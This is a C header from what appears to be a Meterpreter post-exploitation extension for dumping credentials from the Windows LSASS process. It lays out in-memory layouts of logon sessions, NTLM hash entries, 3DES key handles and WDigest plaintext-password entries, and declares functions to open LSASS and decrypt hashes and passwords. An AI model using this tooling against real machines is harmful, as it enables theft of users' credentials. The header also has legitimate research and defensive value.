#ifndef _METERPRETER_SOURCE_EXTENSION_SESSIONDUMP_CORE_H
#define _METERPRETER_SOURCE_EXTENSION_SESSIONDUMP_CORE_H

#include <windows.h>
#include <tlHelp32.h>
#include <tchar.h>
#include <string.h>
#include <Ntsecapi.h>
#include <stdio.h>

#define HASH_LENGTH 16
#define LARGE_BUFFER_SIZE 2048
#define SMALL_BUFFER_SIZE 255

typedef struct _ADDRESSES{
	LONG_PTR LsaEncryptMemoryAddr;
	LONG_PTR LogonSessionListCountAddr;
	LONG_PTR LogonSessionListAddr;
	// Used for OS < Vista SP1
	LONG_PTR FeedbackAddr;
	LONG_PTR PDesxKeyAddr;
	// Used for OS >= Vista SP1
	LONG_PTR IVAddr;
	LONG_PTR H3DesKeyAddr;
	// Used for WDIGEST.DLL
	LONG_PTR WdigestSessionList;
} ADDRESSES;

typedef struct _CREDS_INFOS {
	UCHAR				Domain[256];
	UCHAR				Username[256];
	UCHAR				LMhash[33];
	UCHAR				NTLMhash[33];
	UCHAR				Password[256];
} CREDS_INFOS, *PCREDS_INFOS;

typedef struct _SESSION_ENTRY {
  struct _SESSION_ENTRY *NextEntry;
  struct _SESSION_ENTRY *PrevEntry;
  LUID                       LogonId;
  LSA_UNICODE_STRING         UserName;
  LSA_UNICODE_STRING         LogonDomain;
  DWORD                     Unknown1;
  DWORD                     Unknown2;
  PSID                       Sid;
  ULONG                      LogonType;
  ULONG                      Session;
  DWORD                     Unknown3;
  FILETIME                   FileTime;
  LSA_UNICODE_STRING         LogonServer;
  struct _CREDS_ENTRY        *CredsEntry; // OK for XP, not for other Windows version (offset used in code when needed)
  // etc.
} SESSION_ENTRY, *PSESSION_ENTRY;

typedef struct _CREDS_ENTRY {
  struct _CREDS_ENTRY      *NextEntry;
  ULONG                    AuthenticationPackage;
  struct _CREDS_HASH_ENTRY *CredsHashEntry;
} CREDS_ENTRY, *PCREDS_ENTRY;

typedef struct _CREDS_HASH_ENTRY {
  struct _CREDS_HASH_ENTRY *NextEntry;
  LSA_UNICODE_STRING       PrimaryKeyValue;
  USHORT                   HashLength;
  USHORT                   HashMaximumLength;
  struct _NTLM_CREDS_BLOCK *HashBuffer;
} CREDS_HASH_ENTRY, *PCREDS_HASH_ENTRY;

typedef struct _BCRYPT_KEY_HANDLE {
  DWORD                      Size;
  DWORD                      Tag;         // (0x55555552)
  VOID                       *hAlgorithm; // Pointer to _MSCRYPT_ALG_HANDLE structure, not used here
     // This structure defines the algorithm that is used (3DES, AES, etc.) and various function pointers
     // (MSCryptEncrypt, MSCryptGetProperty, MSCryptGenerateSymmetricKey, etc.)
  VOID *hKey; // (struct _MSCRYPT_KEY_HANDLE * or struct _MSCRYPT_KEY_HANDLE_NT62 depends of Windows version *)
  VOID                       *pbKeyObject;
};

typedef struct _MSCRYPT_KEY_HANDLE {
  DWORD Size;
  DWORD Tag;          // (0x4D53534B)
  DWORD AlgoUsed;
  DWORD Unknown1;
  DWORD Unknown2;
  DWORD KeySize;      // (168 bits)
  DWORD cbSecret;     // (24 bytes)
  BYTE  pbSecret[24]; // 3DES key
  // etc.
} *MSCRYPT_KEY_HANDLE;

typedef struct _MSCRYPT_KEY_HANDLE_NT62 {
  DWORD Size;
  DWORD Tag;          // (0x4D53534B)
  DWORD AlgoUsed;
  DWORD Unknown1;
  DWORD Unknown2;
  DWORD KeySize;      // (168 bits)
  DWORD Unknown3;
  VOID *Unknown4;
  DWORD cbSecret;     // (24 bytes)
  BYTE  pbSecret[24]; // 3DES key
  // etc.
} *MSCRYPT_KEY_HANDLE_NT62;


// WDIGEST.DLL

typedef struct _WDIGEST_NT51_SESSION_ENTRY {
  struct _WDIGEST_NT51_SESSION_ENTRY *Flink;
  struct _WDIGEST_NT51_SESSION_ENTRY *Blink;
  struct _WDIGEST_NT51_SESSION_ENTRY *This;		// "This" and "usageCount" are switched in x64 and next OS versions
  DWORD_PTR usageCount;
  LUID LocallyUniqueIdentifier;
  DWORD_PTR unk1;
  LSA_UNICODE_STRING RessourceType;				// only present for NT 5.1
  LSA_UNICODE_STRING Username;
  LSA_UNICODE_STRING Domain;
  LSA_UNICODE_STRING Password;
  // [..]

} WDIGEST_NT51_SESSION_ENTRY, *PWDIGEST_NT51_SESSION_ENTRY;

typedef struct _WDIGEST_NT52_SESSION_ENTRY {
  struct _WDIGEST_NT52_SESSION_ENTRY *Flink;
  struct _WDIGEST_NT52_SESSION_ENTRY *Blink;
  DWORD_PTR usageCount;
  struct _WDIGEST_NT52_SESSION_ENTRY *This;
  LUID LocallyUniqueIdentifier;
  DWORD_PTR unk1;
  LSA_UNICODE_STRING Username;
  LSA_UNICODE_STRING Domain;
  LSA_UNICODE_STRING Password;
  // [..]

} WDIGEST_NT52_SESSION_ENTRY, *PWDIGEST_NT52_SESSION_ENTRY;

typedef struct _WDIGEST_NT6_SESSION_ENTRY {
  struct _WDIGEST_NT6_SESSION_ENTRY *Flink;
  struct _WDIGEST_NT6_SESSION_ENTRY *Blink;
  DWORD_PTR usageCount;
  struct _WDIGEST_NT6_SESSION_ENTRY *This;
  LUID LocallyUniqueIdentifier;
  DWORD unk1;
  DWORD unk2;
  LSA_UNICODE_STRING Username;
  LSA_UNICODE_STRING Domain;
  LSA_UNICODE_STRING Password;
  // [..]

} WDIGEST_NT6_SESSION_ENTRY, *PWDIGEST_NT6_SESSION_ENTRY;


// typedef for ptr to LsaEncryptMemory function in LSASRV.DLL
typedef void (__stdcall *LsaEncryptMemoryFunction)(unsigned char *buffer, unsigned int length, int mode);

DWORD_PTR GetDllBaseAddr(DWORD dwPid, LPBYTE DllName);
BOOL GetPidByName(LPCTSTR lpszProcessName, LPDWORD lpPid);
BOOL OpenLsass(VOID);
BOOL CloseLsass(VOID);
BOOL GetDataInMemory(VOID);
BOOL GetDataInXPMemory(VOID);
BOOL GetDataInPostVistaMemory(VOID);
int GetHashes(PCREDS_INFOS aCredsInfos);
BOOL DecryptHashes(LPBYTE lpNtlmCredsBlock, DWORD dwLength, PCREDS_INFOS aCredsInfos, int idx_session);
BOOL FormatDecryptedHashes(LPCBYTE lpDecryptedBlock, PCREDS_INFOS aCredsInfos, int idx_session);
int GetWdigestPasswords(PCREDS_INFOS aCredsInfos);
BOOL LsaInitAndDecrypt(LPTSTR lpBuffer, size_t cbBuffer);
BOOL BcryptInitAndDecrypt(LPTSTR lpInput, size_t cbInput, LPTSTR lpOutput);

#endif